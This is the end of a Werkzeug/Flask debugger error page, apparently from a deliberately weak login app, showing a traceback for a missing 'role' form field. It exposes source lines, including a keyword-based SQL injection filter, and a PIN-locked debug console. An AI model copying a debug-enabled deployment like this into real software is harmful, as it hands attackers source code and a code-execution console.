<pre class="line before"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line before"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line current"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre>
<pre class="line after"><span class="ws">        </span>self,</pre>
<pre class="line after"><span class="ws">        </span>rv: ft.ResponseReturnValue | HTTPException,</pre></div>
</div>

<li><div class="frame" id="frame-139045546324928">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">880</em>,
      in <code class="function">full_dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line before"><span class="ws">            </span>request_started.send(self, _async_wrapper=self.ensure_sync)</pre>
<pre class="line before"><span class="ws">            </span>rv = self.preprocess_request()</pre>
<pre class="line before"><span class="ws">            </span>if rv is None:</pre>
<pre class="line current"><span class="ws">                </span>rv = self.dispatch_request()</pre>
<pre class="line after"><span class="ws">        </span>except Exception as e:</pre>
<pre class="line after"><span class="ws">            </span>rv = self.handle_user_exception(e)</pre>
<pre class="line after"><span class="ws">        </span>return self.finalize_request(rv)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def finalize_request(</pre></div>
</div>

<li><div class="frame" id="frame-139045546324144">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/flask/app.py"</cite>,
      line <em class="line">865</em>,
      in <code class="function">dispatch_request</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-139045546325488">
  <h4>File <cite class="filename">"/app/app.py"</cite>,
      line <em class="line">74</em>,
      in <code class="function">login</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span>def login():</pre>
<pre class="line before"><span class="ws">    </span>if request.method == &#39;POST&#39;:</pre>
<pre class="line before"><span class="ws">        </span>response = {&#39;success&#39;: False, &#39;message&#39;: &#39;&#39;, &#39;redirect&#39;: &#39;&#39;}</pre>
<pre class="line before"><span class="ws">        </span>username = request.form[&#39;username&#39;]</pre>
<pre class="line before"><span class="ws">        </span>password = request.form[&#39;password&#39;]</pre>
<pre class="line current"><span class="ws">        </span>role = request.form[&#39;role&#39;]</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span># sqli filter</pre>
<pre class="line after"><span class="ws">        </span>if not is_safe_input(username) or not is_safe_input(password) or not is_safe_input(role):</pre>
<pre class="line after"><span class="ws">            </span>response[&#39;message&#39;] = &#39;Invalid input&#39;</pre>
<pre class="line after"><span class="ws">            </span>response[&#39;success&#39;] = False</pre></div>
</div>

<li><div class="frame" id="frame-139045546324816">
  <h4>File <cite class="filename">"/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py"</cite>,
      line <em class="line">196</em>,
      in <code class="function">__getitem__</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>if key in self:</pre>
<pre class="line before"><span class="ws">            </span>lst = dict.__getitem__(self, key)</pre>
<pre class="line before"><span class="ws">            </span>if len(lst) &gt; 0:</pre>
<pre class="line before"><span class="ws">                </span>return lst[0]</pre>
<pre class="line current"><span class="ws">        </span>raise exceptions.BadRequestKeyError(key)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def __setitem__(self, key, value):</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Like :meth:`add` but removes an existing key first.</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">        </span>:param key: the key for the value.</pre></div>
</div>
</ul>
  <blockquote>werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;role&#39;
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1476, in wsgi_app
    response = self.handle_exception(e)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File &#34;/usr/local/lib/python3.8/site-packages/flask/app.py&#34;, line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File &#34;/app/app.py&#34;, line 74, in login
    role = request.form[&#39;role&#39;]
  File &#34;/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py&#34;, line 196, in __getitem__
    raise exceptions.BadRequestKeyError(key)
werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: &#39;role&#39;
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1498, in __call__
    return self.wsgi_app(environ, start_response)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1476, in wsgi_app
    response = self.handle_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "/app/app.py", line 74, in login
    role = request.form['role']
  File "/usr/local/lib/python3.8/site-packages/werkzeug/datastructures/structures.py", line 196, in __getitem__
    raise exceptions.BadRequestKeyError(key)
werkzeug.exceptions.BadRequestKeyError: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.
KeyError: 'role'


-->
```
